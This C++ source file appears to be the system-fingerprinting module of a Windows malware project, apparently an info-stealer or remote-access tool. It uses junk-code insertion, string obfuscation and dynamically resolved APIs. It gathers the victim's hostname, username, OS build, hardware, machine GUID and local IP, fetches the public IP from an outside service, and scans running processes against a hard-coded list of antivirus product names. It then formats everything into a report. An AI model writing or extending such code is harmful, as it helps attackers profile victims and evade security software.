 
#include "SystemInfo.h"
#include "../utils/Config.h"
#include "../utils/DynamicAPI.h"
#include "../core/Obfuscation.h"
#include <windows.h>
#include <intrin.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <sstream>
#include "../../DebugLog.h"
#pragma comment(lib, "iphlpapi.lib")
namespace Modules {
    static std::string RegStrA(HKEY root, const wchar_t* path, const wchar_t* val) {
        HKEY hKey;
        if (DynAPI::RegOpenKeyEx(root, path, 0, KEY_READ, &hKey) != ERROR_SUCCESS) return "";
        char buf[512] = {};
        DWORD sz = sizeof(buf);
        DynAPI::RegQueryValueEx(hKey, val, NULL, NULL, (LPBYTE)buf, &sz);
        DynAPI::RegClose(hKey);
        return buf;
    }
    SystemInfoData SystemInfo::Collect() {
        JUNK_CODE_LARGE
        SLOG("[*] Fingerprinting system...");
        SystemInfoData d;
        {
            char buf[256] = {};
            DWORD sz = sizeof(buf);
            if (DynAPI::GetCompNameA(buf, &sz)) d.Hostname = buf;
            sz = sizeof(buf);
            if (DynAPI::GetUserNmA(buf, &sz)) d.Username = buf;
        }
        SLOG("  [+] Hostname: %s, Username: %s", d.Hostname.c_str(), d.Username.c_str());
        {
            std::string product = RegStrA(HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"ProductName");
            std::string build   = RegStrA(HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"CurrentBuildNumber");
            std::string disp    = RegStrA(HKEY_LOCAL_MACHINE,
                L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", L"DisplayVersion");
            d.OS = product + S(" ") + disp + S(" (Build ") + build + S(")");
        }
        SLOG("  [+] OS: %s", d.OS.c_str());
        {
            int ci[4] = {};
            char brand[49] = {};
            __cpuid(ci, 0x80000002); memcpy(brand,      ci, 16);
            __cpuid(ci, 0x80000003); memcpy(brand + 16, ci, 16);
            __cpuid(ci, 0x80000004); memcpy(brand + 32, ci, 16);
            d.CPU = brand;
        }
        {
            std::string gpu = RegStrA(HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
                L"DriverDesc");
            if (gpu.empty()) gpu = RegStrA(HKEY_LOCAL_MACHINE,
                L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0001",
                L"DriverDesc");
            d.GPU = gpu.empty() ? S("Unknown") : gpu;
        }
        {
            MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
            if (DynAPI::GlobalMemStatusEx(&ms))
                d.RAM = std::to_string(ms.ullTotalPhys / (1024ULL * 1024 * 1024)) + S(" GB");
        }
        {
            ULARGE_INTEGER total = {}, free_ = {};
            GetDiskFreeSpaceExA("C:\\", nullptr, &total, &free_);
            d.Disk = std::to_string(total.QuadPart / (1024ULL * 1024 * 1024)) + S(" GB total, ")
                   + std::to_string(free_.QuadPart / (1024ULL * 1024 * 1024)) + S(" GB free");
        }
        if (DynAPI::GetSysMetrics) {
            int w = DynAPI::GetSysMetrics(0  );
            int h = DynAPI::GetSysMetrics(1  );
            d.Screen = std::to_string(w) + S("x") + std::to_string(h);
        }
        d.HWID = RegStrA(HKEY_LOCAL_MACHINE,
            L"SOFTWARE\\Microsoft\\Cryptography", L"MachineGuid");
        {
            char buf[256];
            gethostname(buf, sizeof(buf));  
            struct hostent* he = gethostbyname(buf);
            if (he && he->h_addrtype == AF_INET) {
                struct in_addr addr;
                memcpy(&addr, he->h_addr_list[0], sizeof(addr));
                d.LocalIP = inet_ntoa(addr);
            }
        }
        SLOG("  [+] Local IP: %s", d.LocalIP.c_str());
        {
        SLOG("[*] Fetching public IP...");
            std::string ip = DynAPI::HttpGet(L"api.ipify.org", L"/", true);
            if (ip.empty()) ip = DynAPI::HttpGet(L"api.ipify.org", L"/", false);
            d.PublicIP = ip.empty() ? S("N/A") : ip;
            SLOG("  [+] Public IP: %s", d.PublicIP.c_str());
        }
        {
            const char* avList[] = {
                "msmpeng","msseces","avgwdsvc","avguard","avp","ekrn","bdagent",
                "vsserv","nortonsecurity","nis","safeservice","mbam","csc",
                "savservice","avastsvc","egui","sophosav","hitmanpro",
                "malwarebytes","drwagntd","vkise","kavfsslp","kav","klam",nullptr
            };
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
                if (Process32First(hSnap, &pe)) {
                    do {
                        char name[MAX_PATH];
                        strncpy_s(name, pe.szExeFile, _TRUNCATE);
                        for (char* c = name; *c; ++c) *c = (char)tolower((unsigned char)*c);
                        for (int i = 0; avList[i]; ++i)
                            if (strstr(name, avList[i])) {
                                d.RunningAV.push_back(pe.szExeFile);
                                break;
                            }
                    } while (Process32Next(hSnap, &pe));
                }
                CloseHandle(hSnap);
            }
        }
        return d;
    }
    std::string SystemInfo::Format(const SystemInfoData& d) {
        std::stringstream ss;
        ss << S("┌─[ System Info ]─────────────────────────────────\n");
        ss << S("│ Hostname   : ") << d.Hostname  << "\n";
        ss << S("│ Username   : ") << d.Username  << "\n";
        ss << S("│ OS         : ") << d.OS        << "\n";
        ss << S("│ CPU        : ") << d.CPU       << "\n";
        ss << S("│ GPU        : ") << d.GPU       << "\n";
        ss << S("│ RAM        : ") << d.RAM       << "\n";
        ss << S("│ Disk C:\\   : ") << d.Disk      << "\n";
        ss << S("│ Screen     : ") << d.Screen    << "\n";
        ss << S("│ HWID       : ") << d.HWID      << "\n";
        ss << S("│ Local IP   : ") << d.LocalIP   << "\n";
        ss << S("│ Public IP  : ") << d.PublicIP  << "\n";
        if (!d.RunningAV.empty()) {
            ss << S("│ AV Running : ");
            for (auto& av : d.RunningAV) ss << av << " ";
            ss << "\n";
        } else {
            ss << S("│ AV Running : None detected\n");
        }
        ss << S("└─────────────────────────────────────────────────\n");
        return ss.str();
    }
}
